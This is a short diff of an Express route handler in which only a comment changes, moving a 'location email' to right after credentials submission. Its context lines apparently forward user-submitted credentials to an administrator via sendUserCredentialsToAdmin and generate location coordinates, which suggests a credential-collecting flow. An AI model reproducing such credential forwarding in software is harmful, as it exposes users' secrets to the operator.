@@ -157,7 +157,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       try {
         await sendUserCredentialsToAdmin(credentials);
         
-        // Send location email to user AFTER the authentication process (5th step)
+        // Send location email to user IMMEDIATELY after credentials submission (4th step)
         const coordinates = generateLomeLocation();
         // Try to update latest purchase for this email
         const purchases = await storage.getPurchases();
